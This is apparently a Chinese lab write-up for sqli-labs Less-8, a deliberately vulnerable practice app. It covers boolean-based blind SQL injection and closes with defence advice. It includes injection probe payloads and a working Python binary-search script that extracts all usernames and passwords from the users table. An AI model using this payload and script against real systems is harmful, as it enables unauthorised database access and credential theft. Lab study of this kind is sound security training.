## 题目: Sqli-labs Less-8

## 题目描述
页面提示输入 ID 参数进行查询。本关没有任何报错回显，也没有数据回显。无论输入什么，页面都只有两种情况：“You are in...” 或者空白。

## 解题思路
基于页面只有两种状态（True/False），这关是典型的**布尔盲注**。我们无法直接看到数据，只能通过构造 `ascii(substr(...))` 的 Payload，像“盲人摸象”一样，一个字符一个字符地去猜测。

为了提高效率，我们使用 Python 编写**二分法**脚本进行自动化提取，将测试次数从每次 90 多次降低到 7 次。

## 解题步骤

**1. 探测闭合方式**
输入 `?id=1' and 1=1 --+`，页面显示 `You are in...`。
输入 `?id=1' and 1=2 --+`，页面空白。
确认闭合符为单引号 `'`。

**2. 编写 Python 盲注脚本**
利用 `requests` 库发送请求。通过 `ascii(substr(query, i, 1)) > mid` 判断字符的 ASCII 码范围，使用二分法快速锁定字符。

**实战 Payload 核心代码**：
```python
import requests

url = "http://127.0.0.1/sqli-labs/Less-8/"
# 核心修改点：把 database() 换成查 users 表的账号密码
# 0x3a 是十六进制的冒号，用来分隔账号和密码
query = "(select group_concat(username,0x3a,password) from users)"
result = ""

print("开始爆破，请稍候...")

for i in range(1, 200): 
    low = 32
    high = 127
    
    while low <= high:
        mid = (low + high) // 2
        # 二分法 Payload，判断 ASCII 码是否大于 mid
        payload = f"?id=1' and ascii(substr({query},{i},1))>{mid} --+"
        r = requests.get(url + payload)
        
        # 如果页面包含 "You are in"，说明猜出的 ASCII 码比 mid 大
        if "You are in" in r.text:
            low = mid + 1
        else:
            high = mid - 1
            
    if low == 127:
        break
        
    char = chr(low)
    result += char
    print(f"[+] 爆出第 {i} 个字符: {char} | 当前结果: {result}")

print("\n================ 最终结果 ================")
print(result)
print("==========================================")
```
**3. 运行脚本获取数据**
在 CMD 中运行 python less8.py，成功爆出 users 表内的所有账号密码：
```text

```
## 知识点总结
*布尔盲注原理：利用页面回显的差异（有字/无字），结合 and 逻辑运算符，将原本的查询转化为 True/False 的判定。
*二分法提速：手工注入盲注需要测试几十次（例如从 32 测到 126），使用二分法只需 7 次就能锁定一个字符，极大提高了脚本运行速度。
*十六进制分隔符：在 group_concat 中使用 0x3a（冒号）可以完美将多个字段拼接，且不会因为特殊符号导致语法错误。
*防御策略：使用预编译（PDO）彻底隔绝注入；关闭数据库详细报错；严格限制输入类型。
